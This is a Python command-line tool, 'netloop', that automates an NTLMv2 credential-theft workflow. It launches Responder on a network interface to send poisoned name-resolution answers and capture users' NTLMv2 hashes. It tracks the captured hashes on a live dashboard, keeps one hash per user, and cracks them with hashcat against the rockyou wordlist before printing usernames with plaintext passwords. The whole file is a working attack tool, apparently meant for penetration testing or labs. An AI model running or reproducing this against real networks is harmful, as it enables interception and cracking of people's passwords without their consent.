#!/usr/bin/env python3
"""netloop: Wrapper automation for responder + hashcat NTLMv2 workflows."""

from __future__ import annotations

import argparse
import json
import os
import re
import select
import shlex
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple


HOME_CONFIG_PATH = Path.home() / ".netloop_config.json"
LOCAL_CONFIG_PATH = Path.cwd() / ".netloop_config.json"
DEFAULT_RESPONDER_FLAGS = "-wv"
DEFAULT_HASHCAT_FLAGS = "-m 5600"
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
HASH_FILE_GLOB = "*NTLMv2*.txt"
ANSI_RE = re.compile(r"\x1B\[[0-?]*[ -/]*[@-~]")
NTLMV2_IN_LINE_RE = re.compile(r"([^\s:]+::[^\s:]+:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]{16,}:[0-9A-Fa-f]+)")


class Color:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def supports_color() -> bool:
    return sys.stdout.isatty() and os.environ.get("TERM", "") != "dumb"


def supports_inplace_redraw() -> bool:
    # Keep redraw behavior available in typical terminals (including sudo/root shells).
    # TERM-based detection is more reliable here than relying only on isatty().
    term = os.environ.get("TERM", "")
    return term not in ("", "dumb")


def c(text: str, color: str) -> str:
    if not supports_color():
        return text
    return f"{color}{text}{Color.RESET}"


@dataclass
class Stats:
    poisoned_messages: int = 0
    ntlmv2_hash_lines: int = 0
    unique_users: Set[str] = field(default_factory=set)
    user_to_hash: Dict[str, str] = field(default_factory=dict)
    seen_hashes: Set[str] = field(default_factory=set)


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def load_config() -> dict:
    config_path = HOME_CONFIG_PATH if HOME_CONFIG_PATH.exists() else LOCAL_CONFIG_PATH
    if not config_path.exists():
        return {}
    try:
        return json.loads(config_path.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_config(config: dict) -> None:
    try:
        HOME_CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
        return
    except OSError:
        # Fall back to local config when home is not writable.
        LOCAL_CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")


def prompt_with_default(prompt: str, default: str) -> str:
    value = input(f"{prompt} [{default}]: ").strip()
    return value or default


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="netloop automation utility")
    sub = parser.add_subparsers(dest="command", required=True)

    ntlmv2 = sub.add_parser("ntlmv2", help="capture and crack NTLMv2 hashes")
    ntlmv2.add_argument("-I", "--interface", help="network interface for responder")
    ntlmv2.add_argument("--responder-flags", help="extra responder flags")
    ntlmv2.add_argument("--wordlist", help="wordlist path for hashcat")
    ntlmv2.add_argument("--hashcat-flags", help="extra/default hashcat flags")
    ntlmv2.add_argument(
        "--auto-stop-seconds",
        type=int,
        default=0,
        help="optional timeout to stop responder automatically",
    )
    return parser


def parse_hash_line(line: str) -> Optional[Tuple[str, str]]:
    clean = strip_ansi(line).strip()
    if not clean:
        return None

    match = NTLMV2_IN_LINE_RE.search(clean)
    if match:
        clean = match.group(1)

    if "::" not in clean or clean.count(":") < 4:
        return None
    user = clean.split("::", 1)[0].strip()
    if not user:
        return None
    return user, clean


def ingest_hash(stats: Stats, user: str, full_hash: str) -> None:
    if full_hash in stats.seen_hashes:
        return
    stats.seen_hashes.add(full_hash)
    stats.ntlmv2_hash_lines += 1
    stats.unique_users.add(user)
    # Only keep the first observed hash for each user.
    stats.user_to_hash.setdefault(user, full_hash)


def parse_responder_stream_line(line: str, stats: Stats) -> None:
    clean_line = strip_ansi(line)
    if "Poisoned answer sent" in clean_line:
        stats.poisoned_messages += 1

    if "NTLMv2-SSP Hash" in clean_line:
        # Format example:
        # ... NTLMv2-SSP Hash     : user::DOMAIN:...
        if "NTLMv2-SSP Hash" not in clean_line:
            return
        candidate = clean_line.split("NTLMv2-SSP Hash", 1)[1].lstrip(" :")
        parsed = parse_hash_line(candidate)
        if parsed:
            ingest_hash(stats, parsed[0], parsed[1])


def discover_responder_log_paths(session_dir: Path) -> List[Path]:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    paths: List[Path] = []
    for base in candidate_dirs:
        session_log = base / "Responder-Session.log"
        if session_log.exists():
            paths.append(session_log)
    return paths


def poll_responder_logs(stats: Stats, offsets: Dict[Path, int], paths: List[Path]) -> None:
    for path in paths:
        try:
            with path.open("r", encoding="utf-8", errors="ignore") as handle:
                previous = offsets.get(path, 0)
                handle.seek(previous)
                for line in handle:
                    parse_responder_stream_line(line.rstrip("\n"), stats)
                offsets[path] = handle.tell()
        except OSError:
            continue


def read_hashes_from_files(session_dir: Path, stats: Stats) -> None:
    candidate_dirs = [
        session_dir,
        Path.cwd(),
        Path("/usr/share/responder/logs"),
        Path("/usr/local/share/responder/logs"),
    ]
    for base in candidate_dirs:
        if not base.exists():
            continue
        for hash_file in base.glob(HASH_FILE_GLOB):
            try:
                for raw in hash_file.read_text(encoding="utf-8", errors="ignore").splitlines():
                    parsed = parse_hash_line(raw)
                    if parsed:
                        ingest_hash(stats, parsed[0], parsed[1])
            except OSError:
                continue


def render_stats(stats: Stats, live: bool = False) -> None:
    prefix = "LIVE" if live else "FINAL"
    status = (
        f"{c(prefix, Color.CYAN)} | "
        f"Poisoned: {c(str(stats.poisoned_messages), Color.YELLOW)} | "
        f"NTLMv2 Captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)} | "
        f"Unique Users: {c(str(len(stats.unique_users)), Color.BLUE)}"
    )
    print(status)


def render_live_dashboard(
    stats: Stats,
    interface: str,
    responder_flags: str,
    started_at: float,
    auto_stop_seconds: int,
) -> List[str]:
    elapsed = int(time.time() - started_at)
    timer_text = f"{elapsed}s"
    if auto_stop_seconds > 0:
        remaining = max(0, auto_stop_seconds - elapsed)
        timer_text = f"{elapsed}s elapsed | {remaining}s to auto-stop"

    return [
        c("Netloop Live Overview", Color.BOLD),
        f"Mode: NTLMv2 capture/crack | Interface: {interface}",
        f"Responder Flags: {responder_flags}",
        f"Runtime: {timer_text}",
        "",
        f"Poisoned messages: {c(str(stats.poisoned_messages), Color.YELLOW)}",
        f"NTLMv2 hashes captured: {c(str(stats.ntlmv2_hash_lines), Color.GREEN)}",
        f"Unique users captured: {c(str(len(stats.unique_users)), Color.BLUE)}",
        "",
        c("Press Ctrl-C to stop capture and start cracking.", Color.CYAN),
    ]


def draw_live_dashboard(lines: List[str], previous_line_count: int) -> int:
    if not supports_inplace_redraw():
        # Fallback when not attached to an interactive terminal.
        print(" | ".join(line for line in lines if line.strip()))
        return len(lines)

    if previous_line_count > 0:
        # Move up to start of prior dashboard block (widely-supported ANSI sequence).
        sys.stdout.write(f"\033[{previous_line_count}A\r")

    for line in lines:
        # Clear current line then print replacement.
        sys.stdout.write("\033[2K" + line + "\n")

    if previous_line_count > len(lines):
        for _ in range(previous_line_count - len(lines)):
            sys.stdout.write("\033[2K\n")

    sys.stdout.flush()
    return len(lines)


def run_responder(
    interface: str,
    responder_flags: str,
    session_dir: Path,
    stats: Stats,
    auto_stop_seconds: int,
) -> int:
    responder_path = shutil.which("responder")
    if not responder_path:
        print(c("Error: responder not found in PATH.", Color.RED))
        return 127

    cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
    print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))

    interrupted = False
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        cwd=str(session_dir),
        bufsize=1,
    )

    start = time.time()
    responder_logs = discover_responder_log_paths(session_dir)
    log_offsets: Dict[Path, int] = {}
    for log_path in responder_logs:
        try:
            log_offsets[log_path] = log_path.stat().st_size
        except OSError:
            log_offsets[log_path] = 0

    dashboard_lines = render_live_dashboard(stats, interface, responder_flags, start, auto_stop_seconds)
    dashboard_height = draw_live_dashboard(dashboard_lines, previous_line_count=0)
    auto_stop_triggered = False
    last_refresh = 0.0
    try:
        assert proc.stdout is not None
        fd = proc.stdout.fileno()
        while True:
            ready, _, _ = select.select([fd], [], [], 0.25)
            if ready:
                line = proc.stdout.readline()
                if line:
                    parse_responder_stream_line(line.rstrip("\n"), stats)

            poll_responder_logs(stats, log_offsets, responder_logs)

            # Keep the live dashboard moving even with quiet/buffered output.
            now = time.time()
            if now - last_refresh >= 1.0:
                dashboard_lines = render_live_dashboard(
                    stats, interface, responder_flags, start, auto_stop_seconds
                )
                dashboard_height = draw_live_dashboard(
                    dashboard_lines, previous_line_count=dashboard_height
                )
                last_refresh = now

            if (
                proc.poll() is None
                and auto_stop_seconds > 0
                and now - start >= auto_stop_seconds
            ):
                auto_stop_triggered = True
                proc.send_signal(signal.SIGINT)

            if proc.poll() is not None:
                # Drain remaining buffered stdout, then exit.
                remainder = proc.stdout.readline()
                while remainder:
                    parse_responder_stream_line(remainder.rstrip("\n"), stats)
                    remainder = proc.stdout.readline()
                poll_responder_logs(stats, log_offsets, responder_logs)
                break
    except KeyboardInterrupt:
        interrupted = True
        proc.send_signal(signal.SIGINT)
    finally:
        try:
            proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    # Move to a clean line after in-place dashboard rendering and print stop reason.
    print()
    if auto_stop_triggered:
        print(c("Auto-stop timer reached. Stopping responder.", Color.YELLOW))
    elif interrupted:
        print(c("Stopped by user. Starting crack phase.", Color.YELLOW))

    if interrupted:
        return 130
    return proc.returncode or 0


def run_hashcat(hash_file: Path, wordlist: str, hashcat_flags: str, session_dir: Path) -> Tuple[int, List[str]]:
    hashcat_path = shutil.which("hashcat")
    if not hashcat_path:
        print(c("Error: hashcat not found in PATH.", Color.RED))
        return 127, []

    hashcat_cmd = [hashcat_path] + shlex.split(hashcat_flags) + [str(hash_file), wordlist]
    print(c(f"\nRunning hashcat: {' '.join(hashcat_cmd)}", Color.CYAN))
    crack_rc = subprocess.call(hashcat_cmd, cwd=str(session_dir))

    show_cmd = [hashcat_path] + shlex.split(hashcat_flags) + ["--show", str(hash_file)]
    print(c("\nCollecting cracked results...", Color.CYAN))
    show_proc = subprocess.run(show_cmd, cwd=str(session_dir), text=True, capture_output=True)
    cracked = [line.strip() for line in show_proc.stdout.splitlines() if line.strip()]
    return crack_rc, cracked


def format_cracked_rows(rows: List[str]) -> List[str]:
    formatted: List[str] = []
    for row in rows:
        if ":" not in row:
            formatted.append(row)
            continue
        hash_part, plain = row.rsplit(":", 1)
        user = hash_part.split("::", 1)[0]
        formatted.append(f"{user}: {plain}")
    return formatted


def resolve_inputs(parsed_args: argparse.Namespace) -> Tuple[str, str, str, str]:
    cfg = load_config()
    ntlmv2_cfg = cfg.get("ntlmv2", {})

    interface = parsed_args.interface
    if not interface:
        interface_default = ntlmv2_cfg.get("interface", "tun0")
        interface = prompt_with_default("Interface", interface_default)

    responder_flags = parsed_args.responder_flags
    if responder_flags is None:
        responder_flags = prompt_with_default(
            "Responder Flags",
            ntlmv2_cfg.get("responder_flags", DEFAULT_RESPONDER_FLAGS),
        )

    wordlist = parsed_args.wordlist
    if wordlist is None:
        wordlist = prompt_with_default("Wordlist", ntlmv2_cfg.get("wordlist", DEFAULT_WORDLIST))

    hashcat_flags = parsed_args.hashcat_flags
    if hashcat_flags is None:
        hashcat_flags = prompt_with_default(
            "Hashcat Flags",
            ntlmv2_cfg.get("hashcat_flags", DEFAULT_HASHCAT_FLAGS),
        )

    cfg["ntlmv2"] = {
        "interface": interface,
        "responder_flags": responder_flags,
        "wordlist": wordlist,
        "hashcat_flags": hashcat_flags,
    }
    save_config(cfg)
    return interface, responder_flags, wordlist, hashcat_flags


def write_unique_hash_file(session_dir: Path, user_to_hash: Dict[str, str]) -> Path:
    out = session_dir / "unique_ntlmv2_hashes.txt"
    lines = [user_to_hash[user] for user in sorted(user_to_hash.keys())]
    out.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
    return out


def main() -> int:
    parser = build_parser()
    parsed_args = parser.parse_args()

    if parsed_args.command != "ntlmv2":
        print(c("Only 'ntlmv2' command is currently implemented.", Color.RED))
        return 2

    interface, responder_flags, wordlist, hashcat_flags = resolve_inputs(parsed_args)
    session_stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    session_dir = Path.cwd() / "netloop_runs" / session_stamp
    session_dir.mkdir(parents=True, exist_ok=True)
    print(c(f"Session directory: {session_dir}", Color.CYAN))

    stats = Stats()
    responder_rc = run_responder(
        interface,
        responder_flags,
        session_dir,
        stats,
        parsed_args.auto_stop_seconds,
    )

    # Pull hashes from responder output files too, not just stdout.
    read_hashes_from_files(session_dir, stats)

    print()
    render_stats(stats, live=False)
    print(c(f"Responder exited with code: {responder_rc}", Color.CYAN))

    if not stats.user_to_hash:
        print(c("No NTLMv2 hashes captured. Nothing to crack.", Color.YELLOW))
        return 0 if responder_rc in (0, 130) else responder_rc

    unique_hash_file = write_unique_hash_file(session_dir, stats.user_to_hash)
    print(c(f"Cracking one hash per user from: {unique_hash_file}", Color.CYAN))

    if not Path(wordlist).exists():
        print(c(f"Wordlist not found: {wordlist}", Color.RED))
        return 1

    crack_rc, cracked_rows = run_hashcat(unique_hash_file, wordlist, hashcat_flags, session_dir)
    cracked_display = format_cracked_rows(cracked_rows)

    print("\n" + c("Overview", Color.BOLD))
    print(f"- Poisoned messages: {stats.poisoned_messages}")
    print(f"- NTLMv2 hashes captured: {stats.ntlmv2_hash_lines}")
    print(f"- Unique users with captured hashes: {len(stats.unique_users)}")
    print(f"- Hashcat exit code: {crack_rc}")

    if cracked_display:
        print(c("\nCracked hashes:", Color.GREEN))
        for row in cracked_display:
            print(f"  - {row}")
    else:
        print(c("\nNo cracked hashes yet.", Color.YELLOW))

    return 0 if crack_rc == 0 else crack_rc


if __name__ == "__main__":
    sys.exit(main())
